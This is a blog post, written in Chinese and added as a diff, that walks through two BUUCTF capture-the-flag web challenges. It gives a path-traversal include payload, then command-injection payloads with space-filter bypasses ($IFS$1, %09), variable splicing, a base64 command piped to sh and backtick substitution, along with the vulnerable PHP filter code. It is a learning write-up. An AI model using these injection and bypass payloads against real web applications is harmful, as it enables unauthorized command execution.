@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <link href="https://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="generator" content="Hugo 0.78.2" />
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>BUUCTF_warmup&amp;Ping Ping Ping &middot; LHY&#39;bolgs</title>
+  <meta name="description" content="" />
+
+  
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/print.css" media="print">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/poole.css">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/syntax.css">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/hyde.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">
+
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  
+</head>
+
+  <body class="theme-base-00 ">
+  <aside class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <a href="https://hzlhy.github.io/"><h1>LHY&#39;bolgs</h1></a>
+      <p class="lead">
+       小白的初尝试 
+      </p>
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li><a href="https://hzlhy.github.io/">Home</a> </li>
+        <li><a href="/about/"> About me </a></li><li><a href="https://hzlhy.github.io/categories/"> Categories </a></li><li><a href="https://hzlhy.github.io/tags/"> Tags </a></li>
+      </ul>
+    </nav>
+
+    <p>&copy; 2021. All rights reserved. </p>
+  </div>
+</aside>
+
+    <main class="content container">
+    <div class="post">
+  <h1>BUUCTF_warmup&amp;Ping Ping Ping</h1>
+  <time datetime=2021-03-20T18:49:26&#43;0800 class="post-date">Sat, Mar 20, 2021</time>
+  <h2 id="buuctf_warmup">BUUCTF_warmup</h2>
+<p>查看源码发现source.php，访问发现是代码审计</p>
+<p>1.PHP mb_substr()函数：</p>
+<p><code>&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;</code></p>
+<p>返回字符串的一部分</p>
+<p>2.PHP mb_strpos()</p>
+<p>查找字符串在另一个字符串中首次出现的位置</p>
+<p>3.PHP $_REQUEST是用于收集HTML表单提交的数据，PHP $_REQUEST属于PHP的超级全局变量</p>
+<p>4.<code>payload:include source.php(或hint.php)?/../../../../ffffllllaaaagggg</code></p>
+<p><code>include $_REQUEST['file'];</code>中使用了include,为什么路径这样写，是因为我们的参数是有<code>/../../../../</code>这样的路径，所以符合最后一段话如果定义了路径，就会忽略<code>/</code>前的字符串而去找<code>/../../../../ffffllllaaaagggg</code>这个文件，php中include的用法</p>
+<h2 id="ping-ping-ping">Ping Ping Ping</h2>
+<p>题目给了<code>/?ip=</code>后面应该是我们想要执行的语句。先ping一下:<code>127.0.0.1;ls</code>发现可以执行语句；</p>
+<p>试试<code>payload1:cat flag.php</code>发现空格被过滤了；</p>
+<p>####　空格过滤</p>
+<blockquote>
+<ol>
+<li>${IFS}替换</li>
+<li>$IFS$1替换</li>
+<li>${IFS替换</li>
+<li>%20替换</li>
+<li>&lt;和&lt;&gt;重定向符替换</li>
+<li>%09替换</li>
+</ol>
+</blockquote>
+<p>一个个地试，发现<code>{}</code>被过滤了，同时flag也被过滤了，这时去看看index.php发现源码出来了；</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">/?</span><span style="color:#a6e22e">ip</span><span style="color:#f92672">=</span>
+<span style="color:#f92672">|</span><span style="color:#a6e22e">\</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">\</span><span style="color:#e6db74">&#34;|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match)){
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match);
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your symbol!&#34;</span>);
+  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ /&#34;</span>, $ip)){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your space!&#34;</span>);
+  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bash/&#34;</span>, $ip)){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your bash!&#34;</span>);
+  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/.*f.*l.*a.*g.*/&#34;</span>, $ip)){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your flag!&#34;</span>);
+  }
+  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;ping -c 4 &#34;</span><span style="color:#f92672">.</span>$ip);
+  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&#34;</span>;
+  <span style="color:#a6e22e">print_r</span>($a);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>发现很多东西都被过滤了，尝试以下变量拼接（太菜了，这个没看过……其实这篇笔记很多都是参考别人的），<code>payload2:?ip=1;a=g;cat$IFS$1fla$a.php;</code>查看源码即可看到flag</p>
+<h3 id="其他姿势">其他姿势</h3>
+<p>1.base64编码+管道符</p>
+<p><code>payload3:echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
+<p>用base64进行编码，再用命令进行解读。Y2F0IGZsYWcucGhw是cat flag.php的base64编码，用base64 -d命令执行</p>
+<p>=》绕过匹配可以用单引号和双引号，反斜杠，以及$1、$2、$@等绕过（前面的被过滤了……），eg：<code>c$1at gh$@twf01.txt</code></p>
+<h3 id="cat被过滤">cat被过滤</h3>
+<p>(1)more:一页一页的显示档案内容</p>
+<p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p>
+<p>(3)head:查看头几行</p>
+<p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
+<p>(5)tail:查看尾几行</p>
+<p>(6)nl：显示的时候，顺便输出行号</p>
+<p>(7)od:以二进制的方式读取档案内容</p>
+<p>(8)vi:一种编辑器，这个也可以查看</p>
+<p>(9)vim:一种编辑器，这个也可以查看</p>
+<p>(10)sort:可以查看</p>
+<p>(11)uniq:可以查看</p>
+<p>(12)file -f:报错出具体内容</p>
+<h3 id="内敛绕过">内敛绕过</h3>
+<p><code>payload4：?ip=127.0.0.1;cat$IFS$1`ls` </code></p>
+<p>内敛，将反引号内命令的输出作为输入执行。</p>
+
+</div>
+
+
+    </main>
+
+    
+      
+    
+  </body>
+</html>
